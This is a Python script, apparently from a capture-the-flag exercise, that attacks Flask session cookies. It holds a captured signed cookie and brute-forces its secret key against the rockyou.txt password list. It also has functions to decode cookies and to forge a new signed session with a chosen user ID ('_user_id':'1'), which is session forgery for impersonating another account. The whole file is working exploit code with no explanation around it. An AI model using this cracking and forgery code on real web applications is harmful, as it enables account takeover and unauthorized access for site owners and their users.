# standard imports
import sys
import zlib
from itsdangerous import base64_decode
from itsdangerous import base64_encode
import ast


# Lib for argument parsing
import argparse

# external Imports
from flask.sessions import SecureCookieSessionInterface

class MockApp(object):

    def __init__(self, secret_key):
        self.secret_key = secret_key

encodedSessionCookie = '.eJwljjkOAyEMAP9CncLGgGE_s8KXkpbNVlH-HqRoypFG80lnLL-e6Xiv2x_pfFk6UkXmygpsjXxWc6NpUniTsxcUB5Xw4Ri9cYaMtcY0Kw4sg4eqGvAggTakIRNxa710HbuibOy1ZCWALAG72yXmdmBTNLDNtEfuy9f_Bil9fweZMC4.YWoJnQ.mRfWaGF0cLG8Y7thkewb6er7_QE';

def encode(secret_key, session_cookie_structure):
    """ Encode a Flask session cookie """
    try:
        app = MockApp(secret_key)

        session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
        si = SecureCookieSessionInterface()
        s = si.get_signing_serializer(app)

        return s.dumps(session_cookie_structure)
    except Exception as e:
        return "[Encoding error] {}".format(e)
        raise e


def noSecretEncode():
    payload = b'{"_fresh":true,"_id":"4dd6555b47ac3d1da034f9be72e45e04e4fa6416a53ffb650d7a496f0fbccb879ef201f422e322ee273283277dcaaf55c100b7c8ee1f630bb20c37f9fb70c951","_user_id":"1"}'
    data = zlib.compress(payload);
    return base64_encode(data)

def decode(session_cookie_value, secret_key=None):
    """ Decode a Flask cookie  """
    if (secret_key == None):
        compressed = False
        payload = session_cookie_value

        if payload.startswith('.'):
            compressed = True
            payload = payload[1:]

        data = payload.split(".")[0]

        data = base64_decode(data)
        if compressed:
            data = zlib.decompress(data)

        return data
    else:
        app = MockApp(secret_key)

        si = SecureCookieSessionInterface()
        s = si.get_signing_serializer(app)

        return s.loads(session_cookie_value)

with open("../common/rockyou.txt", encoding="latin-1") as handle:
    lines = [l.strip() for l in handle.readlines()]
    for secret_key in lines:
        try:
            decoded = decode(encodedSessionCookie, secret_key)
            print(secret_key)
            print(decoded)
        except:
            pass
